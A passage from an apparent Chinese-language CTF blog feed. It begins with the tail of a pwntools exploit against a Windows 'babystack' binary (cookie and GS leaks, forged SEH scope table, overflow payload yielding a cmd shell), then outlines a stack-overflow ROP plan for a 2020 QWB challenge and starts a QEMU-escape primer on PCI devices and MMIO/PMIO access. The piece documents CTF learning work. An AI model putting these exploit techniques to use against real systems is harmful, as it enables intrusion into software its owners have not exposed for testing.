class="built_in">str</span>(___security_cookie_addr).encode())</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">___security_cookie_value=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&quot;__security_cookie_value&quot;</span>,___security_cookie_value)</span><br><span class="line"></span><br><span class="line">ebp_addr=stack_address+<span class="number">0x9C</span></span><br><span class="line">gs_addr=ebp_addr-<span class="number">0x1C</span></span><br><span class="line">next_addr=ebp_addr-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;more?\r\n&#x27;</span>,<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Where do you want to know\r\n&#x27;</span>,<span class="built_in">str</span>(gs_addr).encode())</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">gs_value=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&quot;gs_value&quot;</span>,gs_value)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;more?\r\n&#x27;</span>,<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Where do you want to know\r\n&#x27;</span>,<span class="built_in">str</span>(next_addr).encode())</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">next_value=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&quot;next_value&quot;</span>,next_value)</span><br><span class="line"></span><br><span class="line">shell_addr=main_addr+<span class="number">0x2DD</span></span><br><span class="line"></span><br><span class="line">SEH_scope_table = p32(<span class="number">0x0FFFFFFE4</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0xFFFFFF20</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0xFFFFFFFE</span>)</span><br><span class="line">SEH_scope_table += p32(shell_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload=SEH_scope_table.ljust(0x80,b&#x27;a&#x27;)+p32(ebp_addr^___security_cookie_value)+b&#x27;b&#x27;*8+p32(next_value)+p32(main_addr + 944)</span></span><br><span class="line"><span class="comment"># payload+=p32(stack_address^___security_cookie_value)+p32(0)</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">4</span>+SEH_scope_table.ljust(<span class="number">0x80</span>-<span class="number">4</span>,<span class="string">b&quot;\x22&quot;</span>)+p32(ebp_addr^___security_cookie_value)+<span class="string">b&quot;b&quot;</span>*<span class="number">8</span>+p32(next_value)</span><br><span class="line">payload+= p32(main_addr + <span class="number">944</span>)+p32((stack_address+<span class="number">4</span>)^___security_cookie_value)+p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sla(<span class="string">b&#x27;more?\r\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;more?\r\n&#x27;</span>,<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Where do you want to know\r\n&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Windows [�汾 10.0.22631.5189]</span><br><span class="line">(c) Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">D:\win_pwn\babystack&gt;</span><br></pre></td></tr></table></figure><blockquote><p>总结一下：</p><p>如果在32位的windows下，要打SEH需要以下的条件：</p><ol><li>泄露<code>__security_cookie</code>（codebase+offset）</li><li>可以泄露栈上的数据（<code>GS、next_value</code>）</li></ol></blockquote><h3 id="2020qwb-stackoverflow"><a href="#2020qwb-stackoverflow" class="headerlink" title="2020qwb_stackoverflow"></a>2020qwb_stackoverflow</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *v3; <span class="comment">// rax</span></span><br><span class="line">  FILE *v4; <span class="comment">// rax</span></span><br><span class="line">  FILE *v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> DstBuf[<span class="number">256</span>]; <span class="comment">// [rsp+20h] [rbp-118h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = _acrt_iob_func(<span class="number">0</span>);</span><br><span class="line">  setbuf(v3, <span class="number">0LL</span>);</span><br><span class="line">  v4 = _acrt_iob_func(<span class="number">1u</span>);</span><br><span class="line">  setbuf(v4, <span class="number">0LL</span>);</span><br><span class="line">  v5 = _acrt_iob_func(<span class="number">2u</span>);</span><br><span class="line">  setbuf(v5, <span class="number">0LL</span>);</span><br><span class="line">  v6 = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    --v6;</span><br><span class="line">    <span class="built_in">memset</span>(DstBuf, <span class="number">0</span>, <span class="keyword">sizeof</span>(DstBuf));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, DstBuf, <span class="number">0x400</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;buffer:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(DstBuf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 &gt; <span class="number">0</span> );</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以显然看到有一个栈溢出和数据的泄露</p><p>基本上保护都开启了</p><p>思路：</p><ol><li>首先泄露codebase的地址，为之后多次泄露地址做准备，之后泄露第一次的cookie然后就重新一次main</li><li>然后尝试泄露ucrtbase.dll的基址</li><li>ROP打system(“cmd”)</li></ol><p>但是在栈上没发现直接的ucrtbase的地址，在windows的IAT中，类似Linux中的got表，通过泄露这个IAT的数据需要拿到程序的基地址</p><p>就不再多赘述</p><h2 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h2><p>首先通过win_server</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">win_server ./babyoverflow.exe 1234</span><br></pre></td></tr></table></figure><p>将这个服务映射到本地<code>127.0.0.1</code>的<code>1234</code>端口上</p><p>然后就可以用pwntools来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1234</span>)</span><br></pre></td></tr></table></figure><p>来访问这个服务</p><p>然后通过x32dbg或x64dbg的文件-&gt;附加-&gt;选择对应的进程pid，就可以进行调试辣</p><p>记住在python脚本中要在准备调试的地方前用pause()停下</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;window-pwn&quot;&gt;&lt;a href=&quot;#window-pwn&quot; class=&quot;headerlink&quot; title=&quot;window_pwn&quot;&gt;&lt;/a&gt;window_pwn&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post</summary>
      
    
    
    
    <category term="windows" scheme="http://s1nec-1o.github.io/categories/windows/"/>
    
    <category term="pwn" scheme="http://s1nec-1o.github.io/categories/windows/pwn/"/>
    
    
    <category term="windows pwn" scheme="http://s1nec-1o.github.io/tags/windows-pwn/"/>
    
  </entry>
  
  <entry>
    <title>Qemu逃逸初识</title>
    <link href="http://s1nec-1o.github.io/2025/05/04/Qemu%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/"/>
    <id>http://s1nec-1o.github.io/2025/05/04/Qemu%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/</id>
    <published>2025-05-04T06:09:27.000Z</published>
    <updated>2025-05-04T06:43:49.250Z</updated>
    
    <content type="html"><![CDATA[<h1 id="qemu逃逸学习"><a href="#qemu逃逸学习" class="headerlink" title="qemu逃逸学习"></a>qemu逃逸学习</h1><p>CTF中的qemu逃逸便是通过在qemu源码中注册一个新的pci，来模拟真实环境下的某一个pci外设，例如键盘控制器之类？通过构造特定的Guest操作触发漏洞（一般是越界读写），最终在Host上获得shell读取flag，主要还是侧重于代码的逆向和漏洞的利用技巧。</p><p>实战中的或许是类似于针对云服务商的？目标是突破租户隔离，来获得宿主机的敏感信息吧，还是非常有意思滴！！！</p><blockquote><p>原文：<a href="https://xz.aliyun.com/news/6166">https://xz.aliyun.com/news/6166</a></p><p>只做学习记录和批注</p><p>好文：<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/09/qemu/">https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/09/qemu/</a></p></blockquote><h2 id="qemu概述"><a href="#qemu概述" class="headerlink" title="qemu概述"></a>qemu概述</h2><p>运行的每个<code>qemu</code>虚拟机都相应的是一个qemu进程，从本质上看，虚拟出的每个虚拟机对应 <code>host</code> 上的一个 <code>qemu</code> 进程，而虚拟机的执行线程（如 <code>CPU</code> 线程、<code>I/O</code> 线程等）对应 <code>qemu</code> 进程的一个线程。</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505041433067.png" alt="image-20250501211959652" style="zoom: 33%;" /><blockquote><p>其中**客户机系统 (Guest)**：运行在 QEMU 之上，是虚拟机中安装的操作系统。</p><p>客户机系统认为自己直接运行在硬件上，但实际上是<strong>通过 QEMU 与底层硬件交互</strong>。</p></blockquote><p>qemu虚拟机内存所对应的真实内存结构如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Guest&#x27; processes</span><br><span class="line">                     +--------------------+</span><br><span class="line">Virtual addr space   |                    |</span><br><span class="line">                     +--------------------+</span><br><span class="line">                     |                    |</span><br><span class="line">                     \__   Page Table     \__</span><br><span class="line">                        \                    \</span><br><span class="line">                         |                    |  Guest kernel</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">Guest&#x27;s phy. memory |    |                    |                |</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">                    |                                          |</span><br><span class="line">                    \__                                        \__</span><br><span class="line">                       \                                          \</span><br><span class="line">                        |             QEMU process                 |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">Virtual addr space |    |                                          |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">                   |                                               |</span><br><span class="line">                    \__                Page Table                   \__</span><br><span class="line">                       \                                               \</span><br><span class="line">                        |                                               |</span><br><span class="line">                   +----+-----------------------------------------------++</span><br><span class="line">Physical memory    |    |                                               ||</span><br><span class="line">                   +----+-----------------------------------------------++</span><br></pre></td></tr></table></figure><p><code>qemu</code>用于模拟设备运行，而qemu逃逸漏洞多发于<strong>模拟pci设备</strong>中，漏洞形成一般是修改<code>qemu-system</code>代码，所以漏洞存在于<code>qemu-system</code>文件内。而逃逸就是指利用漏洞从<code>qemu-system</code>模拟的这个小系统逃到主机内，从而在<code>linux</code>主机内达到命令执行的目的。</p><h2 id="qemu中的地址"><a href="#qemu中的地址" class="headerlink" title="qemu中的地址"></a>qemu中的地址</h2><p>从用户虚拟地址到用户物理地址，从用户物理地址到qemu虚拟地址</p><p>用户的物理内存实际上是<code>qemu</code>程序<code>mmap</code>出来的</p><p><code>-m 1G</code>也就是<code>mmap</code>一块<code>1G</code>的内存</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">    -m 1G \</span><br><span class="line">       -initrd ./rootfs.cpio \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./vmlinuz-5.0.5-generic \</span><br><span class="line">    -L pc-bios/ \</span><br><span class="line">    -append &quot;priority=low console=ttyS0&quot; \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -device pipeline</span><br></pre></td></tr></table></figure><h2 id="pci设备概述"><a href="#pci设备概述" class="headerlink" title="pci设备概述"></a>pci设备概述</h2><p>PCI设备都有一个配置空间（PCI Configuration Space），其记录了关于此设备的详细信息。<strong>大小为256字节</strong>，其中<strong>头部64字节是PCI标准规定</strong>的，当然并非所有的项都必须填充，位置是固定了，没有用到可以填充0。<strong>前16个字节的格式是一定的</strong>，包含头部的类型、设备的总类、设备的性质以及制造商等，格式如下：</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505041433069.png" alt="image-20250501230817541" style="zoom:33%;" /><p>比较关键的是其6个BAR(Base Address Registers)，BAR记录了设备所需要的地址空间的类型，基址以及其他属性。BAR的格式如下：</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505041433070.png" alt="image-20250501230916132" style="zoom: 50%;" /><p>当BAR最后一位<strong>为0表示这是映射的I&#x2F;O内存</strong>，<strong>为1是表示这是I&#x2F;O端口</strong>，当是I&#x2F;O内存的时候1-2位表示内存的类型，<strong>bit 2为1表示采用64位地址，为0表示采用32位地址。bit1为1表示区间大小超过1M，为0表示不超过1M。bit3表示是否支持可预取。</strong></p><p>当最后一位为1时表示映射的I&#x2F;O端口。I&#x2F;O端口一般<strong>不支持预取</strong>，所以这里是29位的地址。</p><p>通过memory space访问设备I&#x2F;O的方式称为memory mapped I&#x2F;O，即<strong>MMIO</strong>，这种情况下，CPU直接使用<strong>普通访存指令即可访问设备I&#x2F;O</strong>。</p><p>通过I&#x2F;O space访问设备I&#x2F;O的方式称为<strong>port I&#x2F;O</strong>，或者port mapped I&#x2F;O，这种情况下CPU需要使用<strong>专门的I&#x2F;O指令如<code>IN/OUT</code>访问I&#x2F;O端口。</strong></p><p>在<strong>MMIO</strong>中，<strong>内存和I&#x2F;O设备共享同一个地址空间。</strong> MMIO是应用得最为广泛的一种I&#x2F;O方法，它<strong>使用相同的地址总线</strong>来处理内存和I&#x2F;O设备，I&#x2F;O设备的内存和寄存器被映射到与之相关联的地址。当CPU访问某个内存地址时，它可能是物理内存，也可以是某个I&#x2F;O设备的内存，用于访问内存的CPU指令也可来访问I&#x2F;O设备。<strong>每个I&#x2F;O设备监视CPU的地址总线</strong>，一旦CPU访问分配给它的地址，它就做出响应，将数据总线连接到需要访问的设备硬件寄存器。为了容纳I&#x2F;O设备，CPU必须预留给I&#x2F;O一个地址区域，该地址区域不能给物理内存使用。</p><p>在<strong>PMIO</strong>中，内存和I&#x2F;O设备有各自的地址空间。 端口映射I&#x2F;O通常使用一种特殊的CPU指令，专门执行I&#x2F;O操作。在Intel的微处理器中，使用的指令是IN和OUT。这些指令可以读&#x2F;写1,2,4个字节（例如：<code>outb</code>, <code>outw</code>, <code>outl</code>）到IO设备上。<strong>I&#x2F;O设备有一个与内存不同的地址空间</strong>，为了实现地址空间的隔离，要么在CPU物理接口上<strong>增加一个I&#x2F;O引脚</strong>，要么<strong>增加一条专用的I&#x2F;O总线</strong>。由于I&#x2F;O地址空间与内存地址空间是隔离的，所以有时将<strong>PMIO称为被隔离的IO</strong>(Isolated I&#x2F;O)。</p><h2 id="pci设备inQemu"><a href="#pci设备inQemu" class="headerlink" title="pci设备inQemu"></a>pci设备inQemu</h2><p><strong>pci设备的寻址是由总线、设备以及功能构成。</strong>如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci</span><br><span class="line">00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)</span><br><span class="line">00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)</span><br><span class="line">00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)</span><br></pre></td></tr></table></figure><p><code>xx:yy:z</code>的格式为<code>总线:设备:功能</code>的格式。</p><p>其中<code>[0000]</code>表示pci的域， PCI域最多可以<strong>承载256条总线</strong>。 每条总线最多可以有<strong>32个设备</strong>，每个设备最多可以<strong>有8个功能</strong>。</p><p>总之每个 PCI 设备有<strong>一个总线号, 一个设备号, 一个功能号标识。</strong>PCI 规范允许单个系统占用多达 256 个总线, 但是因为 256 个总线对许多大系统是不够的, Linux 现在支持 PCI 域。<strong>每个 PCI 域可以占用多达 256 个总线. 每个总线占用 32 个设备</strong>, 每个设备可以是 一个多功能卡(例如一个声音设备, 带有一个附加的 CD-ROM 驱动)<strong>有最多 8 个功能</strong>。</p><p>PCI 设备通过<code>VendorIDs</code>、<code>DeviceIDs</code>、以及<code>Class Codes</code>字段区分：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -v -m -n -s <span class="number">00</span>:<span class="number">03.0</span></span><br><span class="line">Device: <span class="number">00</span>:<span class="number">03.0</span></span><br><span class="line">Class:  <span class="number">00f</span>f</span><br><span class="line">Vendor: <span class="number">1234</span></span><br><span class="line">Device: <span class="number">11e9</span></span><br><span class="line">SVendor:        <span class="number">1</span>af4</span><br><span class="line">SDevice:        <span class="number">1100</span></span><br><span class="line">PhySlot:        <span class="number">3</span></span><br><span class="line">Rev:    <span class="number">10</span></span><br><span class="line"></span><br><span class="line">ubuntu@ubuntu:~$ lspci -v -m -s <span class="number">00</span>:<span class="number">03.0</span></span><br><span class="line">Device: <span class="number">00</span>:<span class="number">03.0</span></span><br><span class="line">Class:  Unclassified device [<span class="number">00f</span>f]</span><br><span class="line">Vendor: Vendor <span class="number">1234</span></span><br><span class="line">Device: Device <span class="number">11e9</span></span><br><span class="line">SVendor:        Red Hat, Inc</span><br><span class="line">SDevice:        Device <span class="number">1100</span></span><br><span class="line">PhySlot:        <span class="number">3</span></span><br><span class="line">Rev:    <span class="number">10</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也可通过查看其<code>config</code>文件来查看设备的配置空间，数据都可以匹配上，如前两个字节<code>1234</code>为<code>vendor id</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ hexdump /sys/devices/pci0000\:00/0000\:00\:03.0/config</span><br><span class="line">0000000 1234 11e9 0103 0000 0010 00ff 0000 0000</span><br><span class="line">0000010 1000 febf c051 0000 0000 0000 0000 0000</span><br><span class="line">0000020 0000 0000 0000 0000 0000 0000 1af4 1100</span><br><span class="line">0000030 0000 0000 0000 0000 0000 0000 0000 0000</span><br></pre></td></tr></table></figure><p>查看设备内存空间：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -v -s 00:03.0 -x</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">        Subsystem: Red Hat, Inc Device 1100</span><br><span class="line">        Physical Slot: 3</span><br><span class="line">        Flags: fast devsel</span><br><span class="line">        Memory at febf1000 (32-bit, non-prefetchable) [size=256]</span><br><span class="line">        I/O ports at c050 [size=8]</span><br><span class="line">00: 34 12 e9 11 03 01 00 00 10 00 ff 00 00 00 00 00</span><br><span class="line">10: 00 10 bf fe 51 c0 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">20: 00 00 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11</span><br><span class="line">30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>可以看到该设备有两个空间：<code>BAR0</code>为<code>MMIO</code>空间，地址为<code>febf1000</code>，大小为<code>256</code>；<code>BAR1</code>为<code>PMIO</code>空间，端口地址为<code>0xc050</code>，大小为<code>8</code>。</p><p>可以通过查看<code>resource</code>文件来查看其相应的内存空间：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ ls -la /sys/devices/pci0000\:00/0000\:00\:03.0/</span><br><span class="line">...</span><br><span class="line">-r--r--r--  1 root root 4096 Aug  1 03:40 resource</span><br><span class="line">-rw-------  1 root root  256 Jul 31 13:18 resource0</span><br><span class="line">-rw-------  1 root root    8 Aug  1 04:01 resource1</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><code>resource</code>文件包含其它相应空间的数据，如<code>resource0</code>（<code>MMIO</code>空间）以及<code>resource1</code>（<code>PMIO</code>空间）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource</span><br><span class="line">0x00000000febf1000 0x00000000febf10ff 0x0000000000040200</span><br><span class="line">0x000000000000c050 0x000000000000c057 0x0000000000040101</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>每行分别表示相应空间的起始地址（<code>start-address</code>）、结束地址（<code>end-address</code>）以及标识位（<code>flags</code>）。</p><h2 id="qemu中访问I-O空间"><a href="#qemu中访问I-O空间" class="headerlink" title="qemu中访问I&#x2F;O空间"></a>qemu中访问I&#x2F;O空间</h2><p>存在<code>mmio</code>与<code>pmio</code>，那么在系统中该如何访问这两个空间呢？访问<code>mmio</code>与<code>pmio</code>都可以采用<strong>在内核态访问</strong>或<strong>在用户空间编程进行访问</strong>。</p><h3 id="访问mmio"><a href="#访问mmio" class="headerlink" title="访问mmio"></a>访问mmio</h3><p>编译<strong>内核</strong>模块，在内核态访问mmio空间，示例代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/io.h&gt;</span>      <span class="comment">// 提供 I/O 内存访问函数（如 readb/writeb）</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ioport.h&gt;</span> <span class="comment">// 提供资源管理相关函数（如 request_mem_region）</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> addr = <span class="built_in">ioremap</span>(ioaddr, iomemsize); <span class="comment">//将物理地址 ioaddr 映射到内核的虚拟地址空间，返回虚拟地址 addr。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">readb</span>(addr);  <span class="comment">// 读取 1 字节（8 位）</span></span><br><span class="line"><span class="built_in">readw</span>(addr);  <span class="comment">// 读取 2 字节（16 位）</span></span><br><span class="line"><span class="built_in">readl</span>(addr);  <span class="comment">// 读取 4 字节（32 位）</span></span><br><span class="line"><span class="built_in">readq</span>(addr);  <span class="comment">// 读取 8 字节（64 位，仅在 64 位系统支持）</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">writeb</span>(val, addr);  <span class="comment">// 写入 1 字节</span></span><br><span class="line"><span class="built_in">writew</span>(val, addr);  <span class="comment">// 写入 2 字节</span></span><br><span class="line"><span class="built_in">writel</span>(val, addr);  <span class="comment">// 写入 4 字节</span></span><br><span class="line"><span class="built_in">writeq</span>(val, addr);  <span class="comment">// 写入 8 字节</span></span><br><span class="line"><span class="built_in">iounmap</span>(addr);</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __iomem *addr;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> val;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 申请资源</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">request_mem_region</span>(ioaddr, iomemsize, <span class="string">&quot;my_device&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> -EBUSY;  <span class="comment">// 资源已被占用</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 映射物理地址</span></span><br><span class="line">addr = <span class="built_in">ioremap</span>(ioaddr, iomemsize);</span><br><span class="line"><span class="keyword">if</span> (!addr) &#123;</span><br><span class="line">    <span class="built_in">release_mem_region</span>(ioaddr, iomemsize);</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 读写操作</span></span><br><span class="line">val = <span class="built_in">readl</span>(addr);          <span class="comment">// 读取 32 位</span></span><br><span class="line"><span class="built_in">writel</span>(val + <span class="number">1</span>, addr);      <span class="comment">// 写入 32 位</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 清理</span></span><br><span class="line"><span class="built_in">iounmap</span>(addr);</span><br><span class="line"><span class="built_in">release_mem_region</span>(ioaddr, 